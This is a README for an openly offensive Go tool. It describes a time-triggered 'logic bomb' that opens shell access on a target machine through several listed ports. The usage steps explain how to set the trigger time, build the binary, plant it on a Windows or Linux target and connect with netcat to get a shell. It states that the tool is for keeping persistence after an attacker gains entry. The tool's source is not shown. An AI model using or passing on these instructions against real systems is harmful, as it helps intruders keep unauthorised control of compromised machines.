# logicbomb-reverse-shell
Description:

This is a GO-based logic-bomb script written by me to spawn a reverse shell by opening random network ports.

Usage:

1. Change the epoch timestamp in the script. Go to www.epochconverter.com and input the CORRECT execution time in your preferred local time/GMT and replace the epoch stamp by your newly created time----Line-->'if timeNow > newtime'. You can also slice up and change the portNos in this script differently and accoding to your desired usage.
2. Shoot up the terminal and 'go build logicbomb.go'
3. Place the created binary file into your desired target location path of windows/Linux.
In Linux,
4. Open up another terminal and "nc -l 'target_ip' 7864/7777/7783/8348/8677/8999". This will spawn a user shell and you are in!
Check whoami, pwd, ls, ifconfig.

Note:
Initial Machine Access Required: yes
This shell should be used to maintain foothold/persistence or for post-exploitation once an attacker gains initial entry.

To Do:

Work more on a user based priviledge esclation technique.

If you have any questions, please email me
shail.patel@nrel.gov

